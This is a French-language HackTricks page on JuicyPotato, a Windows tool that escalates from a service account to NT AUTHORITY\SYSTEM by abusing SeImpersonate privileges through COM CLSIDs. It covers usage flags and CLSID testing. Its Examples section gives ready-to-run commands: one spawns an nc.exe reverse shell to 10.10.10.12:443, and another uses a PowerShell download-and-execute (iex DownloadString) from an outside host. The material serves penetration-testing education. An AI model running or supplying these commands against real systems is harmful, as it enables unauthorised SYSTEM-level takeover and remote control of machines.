# JuicyPotato

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato ne fonctionne pas** sur Windows Server 2019 et Windows 10 build 1809 et versions ultérieures. Cependant, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) peuvent être utilisés pour **exploiter les mêmes privilèges et obtenir un accès de niveau `NT AUTHORITY\SYSTEM`**. _**Vérifiez :**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abus des privilèges dorés) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Une version sucrée de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, avec un peu de jus, c'est-à-dire **un autre outil d'escalade de privilèges locaux, d'un compte de service Windows à NT AUTHORITY\SYSTEM**_

#### Vous pouvez télécharger juicypotato depuis [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Résumé <a href="#summary" id="summary"></a>

[**Depuis le Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) et ses [variantes](https://github.com/decoder-it/lonelypotato) exploitent la chaîne d'escalade de privilèges basée sur le service [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ayant l'écouteur MiTM sur `127.0.0.1:6666` et lorsque vous avez les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`. Lors d'un examen de build Windows, nous avons trouvé une configuration où `BITS` était intentionnellement désactivé et le port `6666` était pris.

Nous avons décidé d'armement [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) : **Dites bonjour à Juicy Potato**.

> Pour la théorie, voir [Rotten Potato - Escalade de privilèges des comptes de service à SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) et suivez la chaîne de liens et de références.

Nous avons découvert que, en plus de `BITS`, il existe plusieurs serveurs COM que nous pouvons exploiter. Ils doivent simplement :

1. être instanciables par l'utilisateur actuel, normalement un "utilisateur de service" qui a des privilèges d'imitation
2. implémenter l'interface `IMarshal`
3. s'exécuter en tant qu'utilisateur élevé (SYSTEM, Administrateur, …)

Après quelques tests, nous avons obtenu et testé une liste étendue de [CLSID intéressants](http://ohpe.it/juicy-potato/CLSID/) sur plusieurs versions de Windows.

### Détails juteux <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vous permet de :

* **CLSID cible** _choisissez n'importe quel CLSID que vous voulez._ [_Ici_](http://ohpe.it/juicy-potato/CLSID/) _vous pouvez trouver la liste organisée par OS._
* **Port d'écoute COM** _définissez le port d'écoute COM que vous préférez (au lieu du 6666 codé en dur)_
* **Adresse IP d'écoute COM** _lier le serveur à n'importe quelle IP_
* **Mode de création de processus** _en fonction des privilèges de l'utilisateur imité, vous pouvez choisir parmi :_
* `CreateProcessWithToken` (nécessite `SeImpersonate`)
* `CreateProcessAsUser` (nécessite `SeAssignPrimaryToken`)
* `les deux`
* **Processus à lancer** _lancez un exécutable ou un script si l'exploitation réussit_
* **Argument de processus** _personnalisez les arguments du processus lancé_
* **Adresse du serveur RPC** _pour une approche furtive, vous pouvez vous authentifier auprès d'un serveur RPC externe_
* **Port du serveur RPC** _utile si vous souhaitez vous authentifier auprès d'un serveur externe et que le pare-feu bloque le port `135`…_
* **MODE TEST** _principalement à des fins de test, c'est-à-dire tester les CLSID. Il crée le DCOM et imprime l'utilisateur du jeton. Voir_ [_ici pour les tests_](http://ohpe.it/juicy-potato/Test/)

### Utilisation <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**Depuis le Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Si l'utilisateur a les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, alors vous êtes **SYSTEM**.

Il est presque impossible d'empêcher l'abus de tous ces serveurs COM. Vous pourriez penser à modifier les permissions de ces objets via `DCOMCNFG`, mais bonne chance, cela va être difficile.

La véritable solution est de protéger les comptes et applications sensibles qui s'exécutent sous les comptes `* SERVICE`. Arrêter `DCOM` inhiberait certainement cette exploitation, mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Examples

Note: Visitez [cette page](https://ohpe.it/juicy-potato/CLSID/) pour une liste de CLSIDs à essayer.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Lancer un nouveau CMD (si vous avez accès RDP)

![](<../../.gitbook/assets/image (300).png>)

## Problèmes de CLSID

Souvent, le CLSID par défaut que JuicyPotato utilise **ne fonctionne pas** et l'exploit échoue. En général, il faut plusieurs tentatives pour trouver un **CLSID fonctionnel**. Pour obtenir une liste de CLSIDs à essayer pour un système d'exploitation spécifique, vous devriez visiter cette page :

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Vérification des CLSIDs**

Tout d'abord, vous aurez besoin de quelques exécutables en plus de juicypotato.exe.

Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, puis téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSIDs possibles à tester.

Ensuite, téléchargez [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(changez le chemin vers la liste des CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port changera, cela signifiera que le CLSID a fonctionné**.

**Vérifiez** les CLSIDs fonctionnels **en utilisant le paramètre -c**

## Références

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
